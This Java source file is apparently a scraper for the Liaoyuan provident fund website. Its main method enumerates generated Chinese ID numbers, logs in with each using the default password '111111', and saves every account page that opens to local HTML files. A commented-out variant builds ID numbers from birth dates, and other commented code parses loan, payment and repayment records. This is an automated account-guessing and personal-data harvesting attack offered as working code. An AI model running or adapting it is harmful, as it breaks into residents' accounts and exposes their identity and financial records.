package cn.springmvc.spider.gjj;

import cn.springmvc.spider.HttpClientFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

/**
 * 吉林辽源
 * Created by nidayu on 16/11/28.
 */
public class LiaoYuan extends HttpClientFactory {

    private CloseableHttpClient httpClient;

    public LiaoYuan(CloseableHttpClient httpClient){
        this.httpClient = httpClient;
    }

    public int login(String userName, String password) {

        String url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/zfbzsq/login_hidden.jsp?password=" + password + "&sfzh=" +
                userName + "&cxyd=%B5%B1%C7%B0%C4%EA%B6%C8&zgzh=";
        String[][] headers = new String[][]{
                {"Referer", "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/zfbzsq/login.jsp"}
        };
        String responseString = getUrl(url, headers, "GBK");

        if (responseString != null && responseString.contains("当前年度")) {
            Document doc = Jsoup.parse(responseString);
            Elements eles = doc.select("input[type=hidden]");

            String name0 = eles.get(0).attr("name");
            String value0 = eles.get(0).attr("value");
            String name1 = eles.get(1).attr("name");
            String value1 = eles.get(1).attr("value");
            String name2 = eles.get(2).attr("name");
            String value2 = eles.get(2).attr("value");
            String name3 = eles.get(3).attr("name");
            String value3 = eles.get(3).attr("value");

            try {
                url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/zfbzsq/main_menu.jsp?" + name0
                        + "="+ value0 +"&" + name1 + "=" + value1 + "&" + name2 + "=" + URLEncoder.encode(value2, "gb2312") + "&" +
                        name3 + "=" + value3 + "&cxyd=%B5%B1%C7%B0%C4%EA%B6%C8";
            } catch (UnsupportedEncodingException e) {

            }
            responseString = getUrl(url, headers, "GBK");

            if (responseString != null && responseString.contains("公积金信息")) {
                try {
                    FileOutputStream fos = new FileOutputStream("C:\\gjj\\"+userName+".html");
                    fos.write(responseString.getBytes());
                    fos.close();
                } catch (IOException e) {

                }
                return 0;
            }
        }
        return 1;
    }

//    private void requestGJJPayBill() {
//        // 今年的
//        String url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/gjjmxcx/gjjmx_cx.jsp";
//        String[][] params = {
//                {data.getString("name0"), data.getString("value0")},
//                {data.getString("name1"), data.getString("value1")},
//                {data.getString("name2"), data.getString("value2")},
//                {data.getString("name3"), data.getString("value3")},
//                {"cxyd", "当前年度"},
//        };
//        postUrl(url, null, new String[]{"gb2312", null, null, null, "gb2312"}, params,
//                null, build(new GongJiJinObserver(30, "公积金缴费明细", Constants.MISS_GONGJIJIN_PAY_HISTORY) {
//                    public void afterRequest(SimpleObject context) {
//                        String responseString = ContextUtil.getContent(context);
//                        parseGJJPayBill(responseString, this);
//                    }
//                }));
//
//        // 去年的
//        url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/gjjmxcx/gjjmx_cx2.jsp";
//        int year = NumberUtils.toInt(DateUtils.getToday("yyyy"));
//        int beforeYear = year - 1;
//        String[][] params2 = {
//                {data.getString("name0"), data.getString("value0")},
//                {data.getString("name1"), data.getString("value1")},
//                {data.getString("name2"), data.getString("value2")},
//                {data.getString("name3"), data.getString("value3")},
//                {"cxyd", "当前年度"}, {"cxydtwo", beforeYear + "_" + year}
//        };
//        postUrl(url, "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/gjjmxcx/gjjmx_cx.jsp", new String[]{"gb2312", null, null, null, "gb2312"},
//                params2, null, build(new GongJiJinObserver(30, "公积金缴费明细", Constants.MISS_GONGJIJIN_PAY_HISTORY) {
//                    public void afterRequest(SimpleObject context) {
//                        String responseString = ContextUtil.getContent(context);
//                        parseGJJPayBill(responseString, this);
//                    }
//                }));
//
//    }
//
//
//    private void requestGJJLoanUserInfo(){
//        String url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/dkxxcx/dkxx_cx.jsp";
//        String[][] params = {
//                {data.getString("name0"), data.getString("value0")},
//                {data.getString("name1"), data.getString("value1")},
//                {data.getString("name2"), data.getString("value2")},
//                {data.getString("name3"), data.getString("value3")},
//                {"cxyd", "当前年度"},
//        };
//        postUrl(url, "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/gjjmxcx/gjjmx_cx2.jsp", new String[]{"gb2312", null, null, null, "gb2312"}, params,
//                null, build(new GongJiJinObserver(30, "公积金缴费明细", Constants.MISS_GONGJIJIN_PAY_HISTORY) {
//                    public void afterRequest(SimpleObject context) {
//                        String responseString = ContextUtil.getContent(context);
//                        parseGJJLoanUserInfo(responseString, this);
//                    }
//                }));
//    }
//
//    private void requestGJJRepayHistoryBill(int pageNo, String[][] par){
//        String url = "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/dkhkcx/dkhk_cx.jsp";
//        if (pageNo == 1) {
//            String[][] params = {
//                    {data.getString("name0"), data.getString("value0")},
//                    {data.getString("name1"), data.getString("value1")},
//                    {data.getString("name2"), data.getString("value2")},
//                    {data.getString("name3"), data.getString("value3")},
//                    {"cxyd", "当前年度"},
//            };
//            postUrl(url, "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/dkxxcx/dkxx_cx.jsp", new String[]{"gb2312", null, null, null, "gb2312"}, params,
//                    null, build(new GongJiJinObserver(30, "公积金缴费明细", Constants.MISS_GONGJIJIN_PAY_HISTORY) {
//                        public void afterRequest(SimpleObject context) {
//                            String responseString = ContextUtil.getContent(context);
//                            parseGJJRepayHistoryBill(responseString, pageNo, this);
//                        }
//                    }));
//        } else {
//            postUrl(url, "http://www.lygjj.gov.cn/lygjjwscx/zfbzgl/dkhkcx/dkhk_cx.jsp", new String[]{"gb2312", null, null, null, "gb2312"}, par,
//                    null, build(new GongJiJinObserver(30, "公积金缴费明细", Constants.MISS_GONGJIJIN_PAY_HISTORY) {
//                        public void afterRequest(SimpleObject context) {
//                            String responseString = ContextUtil.getContent(context);
//                            parseGJJRepayHistoryBill(responseString, pageNo, this);
//                        }
//                    }));
//        }
//    }
//
//    private void parseGJJPayBill(String responseString, GongJiJinObserver gongJiJinObserver) {
//        Elements elements=null;
//        try {
//            logger.info("解析公积金缴费明细开始：");
//            Document document= Jsoup.parse(responseString);
//            elements = document.select("table").get(15).select("tr");
//            for (int i = 1; i < elements.size(); i++) {
//                Elements es = elements.get(i).select("td");
//                GongJiJinPayHistory gongJiJinPayHistory =new GongJiJinPayHistory();
//                gongJiJinPayHistory.setAccount(getUserAccount());
//                addElement(gongJiJinPayHistory);
//                gongJiJinPayHistory.setInfoJson(es.text().toString());
//                gongJiJinPayHistory.setDigest(es.get(1).text());
//                gongJiJinPayHistory.setCurrTime(DateUtils.StringToDate(es.get(0).text(), "yyyy-MM-dd"));
//                gongJiJinPayHistory.setOutcome(NumberUtils.toDouble(es.get(2).text().replaceAll(",","")));
//                gongJiJinPayHistory.setIncome(NumberUtils.toDouble(es.get(3).text().replaceAll(",","")));
//                gongJiJinPayHistory.setBalance(NumberUtils.toDouble(es.get(5).text().replaceAll(",","")));
//            }
//        }catch (Exception e){
//            gongJiJinObserver.error(e,"ParseGJJPayBill error"+ elements.toString());
//        }
//    }
//
//    private void parseGJJLoanUserInfo(String responseString, GongJiJinObserver gongJiJinObserver) {
//        Elements elements=null;
//        try {
//            logger.info("解析公积金贷款信息开始：");
//            Document document= Jsoup.parse(responseString);
//            elements = document.select("table").get(15).select("td");
//            gongJiJinLoanUserInfo.setAccount(getUserAccount());
//            gongJiJinLoanUserInfo.setInfoJson(elements.text());
//            for (int i = 0; i < elements.size(); i++){
//                Element td = elements.get(i);
//                if ("贷款合同编号".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanContractNumber(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("姓名".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanName(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("单位名称".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanCompany(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("身份证号".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanAccountNo(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("贷款年限".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanTermYear(NumberUtils.toInt(elements.get(i + 1).select("font").text().replace(" ", "")));
//                }
//                if ("贷款金额".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanAmount(NumberUtils.toDouble(elements.get(i + 1).select("font").text().replace(" ", "")));
//                }
//                if ("放款日期".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanStartDate(
//                            DateUtils.StringToDate(elements.get(i + 1).select("font").text().replace(" ", ""), "yyyy-MM-dd"));
//                }
//                if ("还款方式".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanRepayType(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("受托银行".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanBank(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("担保方式".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanAssureMeans(elements.get(i + 1).select("font").text().replace(" ", ""));
//                }
//                if ("历史逾期期数".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanOverdueNumber(NumberUtils.toInt(elements.get(i + 1).select("font").text().replace(" ", "")));
//                }
//                if ("已还本金".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanRepayPrincipal(NumberUtils.toDouble(elements.get(i + 1).select("font").text().replace(" ", "").replace(",", "")));
//                }
//                if ("已还利息".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanRepayPercent(NumberUtils.toDouble(elements.get(i + 1).select("font").text().replace(" ", "").replace(",", "")));
//                }
//                if ("罚息利率".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanPenaltyInterestPercent(NumberUtils.toDouble(elements.get(i + 1).select("font").text().replace(" ", "")));
//                }
//                if ("贷款利率".equals(td.text())){
//                    gongJiJinLoanUserInfo.setLoanInterestPercent(NumberUtils.toDouble(elements.get(i + 1).select("font").text().replace(" ", "")));
//                }
//            }
//        }catch (Exception e){
//            gongJiJinObserver.error(e,"ParseGJJLoanUserInfo error" + elements.toString());
//        }
//    }
//
//    private void parseGJJRepayHistoryBill(String responseString, int page, GongJiJinObserver gongJiJinObserver) {
//        Elements elements=null;
//        try {
//            logger.info("解析公积金还款明细开始：");
//            Document document= Jsoup.parse(responseString);
//            elements = document.select("table").get(13).select("tr");
//            for (int i = 2; i < elements.size(); i++) {
//                Elements es = elements.get(i).select("td");
//                if (es.size() < 7){
//                    continue;
//                }
//                GongJiJinRepayHistory gongJiJinRepayHistory =new GongJiJinRepayHistory();
//                gongJiJinRepayHistory.setAccount(getUserAccount());
//                addElement(gongJiJinRepayHistory);
//                gongJiJinRepayHistory.setInfoJson(es.toString());
//                gongJiJinRepayHistory.setRepayDate(DateUtils.StringToDate(es.get(0).text(),"yyyy-MM-dd"));
//                gongJiJinRepayHistory.setMonthlyRepayCapital(NumberUtils.toDouble(es.get(2).text().replaceAll(",","")));
//                gongJiJinRepayHistory.setMonthlyRepayInterest(NumberUtils.toDouble(es.get(3).text().replaceAll(",","")));
//                gongJiJinRepayHistory.setRepayPenalty(NumberUtils.toDouble(es.get(5).text().replaceAll(",","")));
//                gongJiJinRepayHistory.setRepayCapitalBalance(NumberUtils.toDouble(es.last().text().replaceAll(",","")));
//            }
//            int intPageCount = NumberUtils.toInt(document.select("input[name=intPageCount]").attr("value"));
//            if (page < intPageCount){
//                int startRow = NumberUtils.toInt(document.select("input[name=startRow]").attr("value"));
//                int endRow = NumberUtils.toInt(document.select("input[name=endRow]").attr("value"));
//                int intRowCount = NumberUtils.toInt(document.select("input[name=intRowCount]").attr("value"));
//                int intPageSize = NumberUtils.toInt(document.select("input[name=intPageSize]").attr("value"));
//                String sfzh = document.select("input[name=sfzh]").attr("value");
//                String zgzh = document.select("input[name=zgzh]").attr("value");
//                String zgxm = document.select("input[name=zgxm]").attr("value");
//                String flag = document.select("input[name=flag]").attr("value");
//                String[][] params = {
//                        {"intPage", (page + 1) + ""}, {"startRow", (startRow + intPageSize) + ""},
//                        {"endRow", (endRow + intPageSize) + ""}, {"intRowCount", intRowCount + ""},
//                        {"intPageCount", intPageCount + ""}, {"intPageSize", intPageSize + ""},
//                        {"sfzh", sfzh}, {"zgzh", zgzh}, {"zgxm", zgxm}, {"flag", flag}
//                };
//                requestGJJRepayHistoryBill(page + 1, params);
//            }
//        }catch (Exception e){
//            gongJiJinObserver.error(e,"ParseGJJRepayHistoryBill error"+elements.toString());
//        }
//    }

    public static void main(String[] args) {

        CloseableHttpClient httpClient = getInstance();
        LiaoYuan liaoYuan = new LiaoYuan(httpClient);
        String first = "01";
        for (int j = 1081; j < 100000; j++){ //
            String begin = "0000" + j;
            begin = begin.substring(begin.length() - 5);
            int total = 0;
            no : for (int i = 300; i < 10000 ; i++) {
                String end = "00000" + i;
                end = end.substring(end.length() - 6);
                int index = liaoYuan.login(first + begin + end, "111111");
                if (index == 0){
                    // 有数据
                    total = 0;
                } else {
                    // 无数据
                    total = total + 1;
                }
                if (total > 20){
                    // 连续10个没有数据
                    break no;
                }
                try {
                    Thread.sleep(3 * 1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
        // 取年
//        for (int year = 1970; year < 1995; year ++) {
//            // 取月
//            for (int mon = 1; mon < 13; mon ++){
//                String month = mon < 10 ? ("0"+mon) : mon + "";
//                // 取日
//                int lastDay = 31;
//                if (mon == 2){
//                    lastDay = 28;
//                } else if (mon == 4 || mon == 6 || mon ==9 || mon == 11){
//                    lastDay = 30;
//                }
//                for (int day = 1; day <= lastDay; day ++){
//                    String thisDay = day < 10 ? ("0" + day) : day + "";
//                    for (int last = 1; last < 10000; last++) {
//                        String four = "000" + last;
//                        four = four.substring(four.length() - 4);
//                        String info = first + year + month + thisDay + four;
//                        System.out.println(info);
//                        liaoYuan.login(info, "111111");
//                        try {
//                            Thread.sleep(3 * 1000);
//                        } catch (InterruptedException e) {
//                            e.printStackTrace();
//                        }
//                    }
//                }
//            }
//        }
    }

}
